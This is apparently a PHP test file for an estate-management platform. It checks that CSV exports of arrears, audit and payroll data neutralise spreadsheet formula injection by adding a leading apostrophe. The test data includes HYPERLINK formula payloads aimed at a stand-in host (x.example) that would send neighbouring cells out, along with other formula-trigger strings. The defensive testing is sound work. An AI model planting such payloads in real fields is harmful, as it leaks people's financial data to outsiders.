<?php

declare(strict_types=1);

use App\Models\AuditEntry;
use App\Models\Estate\Employee;
use App\Models\Estate\PayrollRun;
use App\Models\Estate\PayrollRunLine;
use App\Models\Role;
use App\Services\Exports\Exporter;
use App\Services\Payroll\BankCreditCsv;
use Illuminate\Support\Facades\DB;
use Tests\Support\FacilitiesFixture;

/*
|--------------------------------------------------------------------------
| A CSV this platform writes never hands a spreadsheet a formula (B074)
|--------------------------------------------------------------------------
|
| `Exporter::csv()` wrote every cell with `fputcsv` as it came. A unit claimant
| can name themselves anything — `=HYPERLINK("https://x.example/?"&A2&B2,"Lot 47")`
| is a valid full name — and once the estate approves the claim that name is the
| household's primary resident, so it lands in the arrears register the Treasurer
| exports and opens in Excel, which the Exporter's own docblock names as the
| reader. There it is a live formula that can send the neighbouring cells — who
| owes what — to a stranger's server.
|
| A text cell that a spreadsheet would read as a formula (= + - @, a tab or a
| carriage return first, or their full-width forms) is now written with a leading
| apostrophe, the mark every spreadsheet reads as "this is text". A number is not
| text and is written as it was: `-1500.00` is a credit balance, not a formula,
| and quoting it would stop the office adding the column up.
|
| WRITTEN AGAINST THE OLD BEHAVIOUR FIRST: `=1+1` came out as `=1+1`.
|
*/

beforeEach(function () {
    FacilitiesFixture::platform();

    DB::connection('mysql')->beginTransaction();

    $this->withoutVite();
});

afterEach(function () {
    DB::connection('mysql')->rollBack();
});

/** What `Exporter::csv()` streams for these rows, parsed back as a spreadsheet would read the file. */
function exportedCells(array $headers, array $rows): array
{
    $response = app(Exporter::class)->csv('B074 formula test', $headers, $rows, 'b074.csv');

    ob_start();
    $response->sendContent();
    $csv = (string) ob_get_clean();

    $csv = preg_replace('/^\xEF\xBB\xBF/', '', $csv);

    $stream = fopen('php://temp', 'r+b');
    fwrite($stream, (string) $csv);
    rewind($stream);

    $parsed = [];

    // RFC 4180, as the Exporter writes it and as a spreadsheet reads it.
    while (($line = fgetcsv($stream, escape: '')) !== false) {
        $parsed[] = $line;
    }

    fclose($stream);

    return $parsed;
}

it('writes a cell a spreadsheet would run as a formula as text instead', function () {
    // The claimant's name from the finding, and the other ways a cell starts a formula.
    $hyperlink = '=HYPERLINK("https://x.example/?"&A2&B2,"Lot 47")';

    $cells = array_column(array_slice(exportedCells(['Name'], [
        ['=1+1'],
        [$hyperlink],
        ['+SUM(A1:A9)'],
        ['-2+3'],
        ['@SUM(A1)'],
        ["\tcmd"],
        ["\rcmd"],
        ['＝1+1'],
    ]), 1), 0);

    expect($cells)->toBe([
        "'=1+1",
        "'".$hyperlink,
        "'+SUM(A1:A9)",
        "'-2+3",
        "'@SUM(A1)",
        "'\tcmd",
        "'\rcmd",
        "'＝1+1",
    ]);
});

it('leaves numbers, ordinary text and empty cells exactly as they were', function () {
    $cells = array_slice(exportedCells(['Unit', 'Resident', 'Balance JMD', 'Count', 'Rate', 'Phone', 'Last payment', 'Share', 'Note'], [
        ['Lot 47', 'Marcia Brown-Campbell', '-1500.00', 3, -2.5, '+18765550142', null, '-12.5%', 'Paid at C:\\office "front desk"'],
    ]), 1)[0];

    expect($cells)->toBe(['Lot 47', 'Marcia Brown-Campbell', '-1500.00', '3', '-2.5', '+18765550142', '', '-12.5%', 'Paid at C:\\office "front desk"']);
});

it('neutralises a name that reached an export through the screens, not only through the class', function () {
    $director = FacilitiesFixture::geminiViewer(Role::DIRECTOR);

    AuditEntry::create([
        'tenant_id' => null,
        'actor_name' => '=HYPERLINK("https://x.example/?"&B2,"Director")',
        'actor_role' => 'Director',
        'action' => 'user.renamed',
        'entity_type' => 'User',
        'entity_id' => 'b074-probe',
    ]);

    $csv = $this->actingAs($director)->get('/audit/export?q=b074-probe')->assertOk()->streamedContent();

    expect($csv)->toContain('"\'=HYPERLINK(""https://x.example/?""&B2,""Director"")"')
        ->and($csv)->not->toMatch('/(^|,)"?=HYPERLINK/m');
});

it('neutralises the payroll bank file too, which an office re-saves into its bank\'s template', function () {
    // Built in memory: the file is a function of these rows, and nothing here needs a database row.
    $employee = (new Employee)->forceFill([
        'full_name' => '=HYPERLINK("https://x.example/","Pay me")',
        'bank_name' => 'NCB',
        'bank_account_number' => '123456789',
    ]);

    $line = (new PayrollRunLine)->forceFill(['net_minor' => 1_234_56]);
    $line->setRelation('employee', $employee);

    $run = (new PayrollRun)->forceFill(['reference' => 'PR-B074']);

    $csv = app(BankCreditCsv::class)->build($run, collect([$line]));

    expect($csv)->toContain('"\'=HYPERLINK(""https://x.example/"",""Pay me"")"')
        ->and($csv)->toContain(',1234.56,');
});
